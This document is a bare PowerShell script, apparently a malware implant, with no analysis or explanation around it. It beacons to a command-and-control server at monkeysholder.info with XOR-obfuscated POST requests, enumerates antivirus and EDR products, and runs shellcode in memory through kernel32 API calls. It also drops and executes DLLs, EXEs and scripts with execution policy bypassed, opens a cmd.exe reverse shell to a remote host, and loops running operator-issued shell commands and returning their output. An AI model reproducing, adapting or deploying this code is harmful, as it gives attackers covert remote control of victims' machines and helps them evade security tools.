$C2 = 'http://monkeysholder.info/index.php?'
function Send-Req($id, $body) {
  $tid = -join ((1..8) | ForEach-Object { '{0:x}' -f (Get-Random -Max 16) })
  $w = [System.Net.HttpWebRequest]::Create($C2 + [guid]::NewGuid().ToString('N').Substring(0,8))
  $w.Method = 'POST'; $w.ContentType = 'application/octet-stream'
  $w.Headers.Add('Client-Id', $script:cid); $w.Headers.Add('Client-Version', '02010000')
  $w.Headers.Add('Request-Id', $id); $w.Headers.Add('Request-Status', '1'); $w.Headers.Add('Trace-Id', $tid)
  $k = [BitConverter]::GetBytes([Convert]::ToUInt32($tid, 16))
  for ($i = 0; $i -lt $body.Length; $i++) { $body[$i] = $body[$i] -bxor $k[$i % 4] }
  $s = $w.GetRequestStream(); $s.Write($body, 0, $body.Length); $s.Close()
  return (New-Object IO.StreamReader($w.GetResponse().GetResponseStream())).ReadToEnd()
}
function Get-AV {
  $out = @()
  $map = @{ 'Kaspersky'="$env:ProgramFiles\Kaspersky Lab"; 'ESET'="$env:ProgramFiles\ESET"; 'Avast'="$env:ProgramFiles\Avast Software"; 'Bitdefender'="$env:ProgramFiles\Bitdefender"; 'CrowdStrike'="$env:ProgramFiles\CrowdStrike"; 'SentinelOne'="$env:ProgramFiles\SentinelOne"; 'Carbon Black'="$env:ProgramFiles\Confer"; 'Sophos'="$env:ProgramFiles\Sophos" }
  foreach ($k in $map.Keys) { if (Test-Path $map[$k]) { $out += $k } }
  if ((Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -EA 0).DisableAntiSpyware -ne 1) { $out += 'Defender' }
  if (Test-Path 'HKLM:\SOFTWARE\Microsoft\Windows Advanced Threat Protection\Status') { $out += 'MDE' }
  $out -join ','
}
Add-Type @"
using System; using System.Runtime.InteropServices;
public class K32 {
  [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
  [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint n, out uint o);
  [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr st, IntPtr p, uint f, IntPtr id);
  [DllImport("kernel32")] public static extern IntPtr LoadLibraryA(string n);
}
"@
function Run-Shellcode([byte[]]$sc) {
  $m = [K32]::VirtualAlloc([IntPtr]::Zero, $sc.Length, 0x3000, 0x04)
  [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $m, $sc.Length)
  $o = 0; [K32]::VirtualProtect($m, $sc.Length, 0x20, [ref]$o) | Out-Null
  [K32]::CreateThread([IntPtr]::Zero, 0, $m, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
}
function Run-Dll([byte[]]$d, $exp) {
  $p = Join-Path $env:TEMP ((Get-Random).ToString() + '.dll'); [IO.File]::WriteAllBytes($p, $d)
  if ($exp) { Start-Process rundll32.exe "$p,$exp" } else { [K32]::LoadLibraryA($p) | Out-Null }
}
function Run-Exe([byte[]]$d, $wmi) {
  $p = Join-Path $env:TEMP ((Get-Random).ToString() + '.exe'); [IO.File]::WriteAllBytes($p, $d)
  if ($wmi) { Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $p } else { Start-Process $p }
}
function Run-Ps([string]$s) {
  $p = Join-Path $env:TEMP ((Get-Random).ToString() + '.ps1'); Set-Content $p $s
  Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File $p"
}
function Rev-Shell($h, $port) {
  $c = New-Object Net.Sockets.TcpClient($h, $port); $st = $c.GetStream()
  $pi = New-Object Diagnostics.ProcessStartInfo('cmd.exe', '/K chcp 65001')
  $pi.RedirectStandardInput = $true; $pi.RedirectStandardOutput = $true; $pi.UseShellExecute = $false
  $pr = [Diagnostics.Process]::Start($pi)
  $pr.StandardOutput.BaseStream.CopyToAsync($st); $st.CopyToAsync($pr.StandardInput.BaseStream)
}
function Is-Admin { try { New-ItemProperty 'HKLM:\Software' -Name t9 -Value 1 -EA Stop | Out-Null; Remove-ItemProperty 'HKLM:\Software' -Name t9; $true } catch { $false } }
while ($true) {
  $cmd = Send-Req '0' ([byte[]]@())
  if ($cmd -match '^shell (.*)') { $r = cmd.exe /c $matches[1] 2>&1 | Out-String; Send-Req '2' ([Text.Encoding]::UTF8.GetBytes($r)) }
  Start-Sleep 30
}
